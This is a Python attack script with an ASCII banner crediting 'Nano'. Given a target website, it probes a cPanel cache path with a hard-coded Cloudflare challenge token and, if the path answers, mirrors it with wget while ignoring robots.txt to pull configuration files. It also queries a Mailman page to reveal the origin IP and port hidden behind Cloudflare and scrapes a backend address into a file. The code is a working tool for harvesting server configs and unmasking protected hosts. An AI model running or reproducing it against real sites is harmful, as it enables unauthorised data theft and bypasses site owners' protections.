import sys
import requests 
import os
import colorama

from urllib.parse import urlparse
from colorama import Fore, Back, Style





def check():
    if len(sys.argv) < 2:
       os.system('clear')
       
       print (f"\n\n sorry Please Supply A Website To Test")
       sys.exit()
    else:
         print("") 

check()
    
def banner():
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    print(f"""

                        
    
    {r}   ___   __                 _               
    {g}  / __\ / /  ___  _   _  __| |___ ___ _ __  
    {r} / /   / /  / _ \| | | |/ _` / __/ __| '_ \ 
    {g}/ /___/ /__| (_) | |_| | (_| \__ \__ \ |_) |
    {r}\____/\____/\___/ \__,_|\__,_|___/___/ .__/ 
                                         {g}|_|    

                   | {w}Made By Nano {g}| 

        """)

            
            
def exploits():
    
    
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    url = sys.argv[1]+''
    x = requests.get(url+'//.cpanel/caches/config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if x.status_code == 404:
              banner()
              print(f'{r}\nConfigs = Not found')
              
              
    else:
            check()
            banner()
            print(f"{r}Found Something Please Wait...")
            os.system("wget --execute='robots = off' --mirror --convert-links --no-parent --wait=1 "+sys.argv[1]+"//.cpanel/caches/config/" + ">/dev/null 2>&1")
            print(f"{g}Found CPANEL Configs!!! \n{r}Check Current Dirrectory \n\n{w}Checking For backend...")
    


    


def ight():
    
    
    
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    url = sys.argv[1]+''
    x = requests.get(url+'//mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    
    if x.status_code == 404:
              
              banner()
              print(f'{r}CloudSSP = Not vuln')
              exploits()
    else:
          
          
          exploits()
          arg = sys.argv[1]+''
          with requests.get(arg, stream=True) as rsp:
                ip, port = rsp.raw._connection.sock.getpeername()
                
                
                print(f"{g}Url : " + arg)
                print(f"{r}Protected ip : " + ip)
                print(f"{r}Protected port :",port)
                print(w + "\nBackend : " + g)
                os.system(f"curl "+sys.argv[1]+"//mailman/listinfo/mailman -s | grep /mailman/subscribe/mailman | cut -c31-110 | tee backend.txt")
                
                
          
      


ight()


